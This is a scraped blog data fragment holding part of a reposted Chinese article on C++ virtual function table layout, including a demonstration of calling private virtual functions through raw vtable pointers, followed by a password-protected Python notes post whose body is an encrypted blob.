2.6.22 + GCC 4.1.3下，这个值是如果1，表示还有下一个虚函数表，如果值是0，表示是最后一个虚函数表。 下面，我将分别说明“无覆盖”和“有覆盖”时的虚函数表的样子。没有覆盖父类的虚函数是毫无意义的。我之所以要讲述没有覆盖的情况，主要目的是为了给一个对比。在比较之下，我们可以更加清楚地知道其内部的具体实现。 一般继承（无虚函数覆盖）下面，再让我们来看看继承时的虚函数表是什么样的。假设有如下所示的一个继承关系： 请注意，在这个继承关系中，子类没有重载任何父类的函数。那么，在派生类的实例中，其虚函数表如下所示：对于实例：Derive d; 的虚函数表如下：我们可以看到下面几点： 虚函数按照其声明顺序放于表中。 父类的虚函数在子类的虚函数前面。我相信聪明的你一定可以参考前面的那个程序，来编写一段程序来验证。 一般继承（有虚函数覆盖）覆盖父类的虚函数是很显然的事情，不然，虚函数就变得毫无意义。下面，我们来看一下，如果子类中有虚函数重载了父类的虚函数，会是一个什么样子？假设，我们有下面这样的一个继承关系。 为了让大家看到被继承过后的效果，在这个类的设计中，我只覆盖了父类的一个函数：f()。那么，对于派生类的实例，其虚函数表会是下面的一个样子： 我们从表中可以看到下面几点， 覆盖的f()函数被放到了虚表中原来父类虚函数的位置。 没有被覆盖的函数依旧。这样，我们就可以看到对于下面这样的程序， Base *b = new Derive(); b-&gt;f(); 由b所指的内存中的虚函数表的f()的位置已经被Derive::f()函数地址所取代，于是在实际调用发生时，是Derive::f()被调用了。这就实现了多态。 多重继承（无虚函数覆盖）下面，再让我们来看看多重继承中的情况，假设有下面这样一个类的继承关系。注意：子类并没有覆盖父类的函数。 对于子类实例中的虚函数表，是下面这个样子： 我们可以看到： 每个父类都有自己的虚表。 子类的成员函数被放到了第一个父类的表中。（所谓的第一个父类是按照声明顺序来判断的） 这样做就是为了解决不同的父类类型的指针指向同一个子类实例，而能够调用到实际的函数。 多重继承（有虚函数覆盖） 下面我们再来看看，如果发生虚函数覆盖的情况。 下图中，我们在子类中覆盖了父类的f()函数。 下面是对于子类实例中的虚函数表的图： 我们可以看见，三个父类虚函数表中的f()的位置被替换成了子类的函数指针。这样，我们就可以任一静态类型的父类来指向子类，并调用子类的f()了。如： Derive d; Base1 *b1 = &amp;d; Base2 *b2 = &amp;d; Base3 *b3 = &amp;d; b1-&gt;f(); //Derive::f() b2-&gt;f(); //Derive::f() b3-&gt;f(); //Derive::f() b1-&gt;g(); //Base1::g() b2-&gt;g(); //Base2::g() b3-&gt;g(); //Base3::g() 安全性每次写C++的文章，总免不了要批判一下C++。这篇文章也不例外。通过上面的讲述，相信我们对虚函数表有一个比较细致的了解了。水可载舟，亦可覆舟。下面，让我们来看看我们可以用虚函数表来干点什么坏事吧。 一、通过父类型的指针访问子类自己的虚函数我们知道，子类没有重载父类的虚函数是一件毫无意义的事情。因为多态也是要基于函数重载的。虽然在上面的图中我们可以看到Base1的虚表中有Derive的虚函数，但我们根本不可能使用下面的语句来调用子类的自有虚函数： Base1 *b1 = new Derive(); b1-&gt;f1(); //编译出错 任何妄图使用父类指针想调用子类中的未覆盖父类的成员函数的行为都会被编译器视为非法，所以，这样的程序根本无法编译通过。但在运行时，我们可以通过指针的方式访问虚函数表来达到违反C++语义的行为。（关于这方面的尝试，通过阅读后面附录的代码，相信你可以做到这一点） 二、访问non-public的虚函数另外，如果父类的虚函数是private或是protected的，但这些非public的虚函数同样会存在于虚函数表中，所以，我们同样可以使用访问虚函数表的方式来访问这些non-public的虚函数，这是很容易做到的。 如： class Base { private: virtual void f() { cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; } }; class Derive : public Base{ }; typedef void(*Fun)(void); void main() { Derive d; Fun pFun = (Fun)*((int*)*(int*)(&amp;d)+0); pFun(); } 结束语C++这门语言是一门Magic的语言，对于程序员来说，我们似乎永远摸不清楚这门语言背着我们在干了什么。需要熟悉这门语言，我们就必需要了解C++里面的那些东西，需要去了解C++中那些危险的东西。不然，这是一种搬起石头砸自己脚的编程语言。 文章转载：http://www.cppblog.com/dawnbreak/archive/2009/03/10/76084.aspx","tags":[{"name":"C++","slug":"C","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"},{"name":"vtable","slug":"vtable","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/vtable/"}]},{"title":"python各种用法总结","date":"2017-02-15T07:11:45.000Z","path":"2017/02/15/pythonNote/pythonNote/","text":"Need password to decrypt! Incorrect Password! No content to display! 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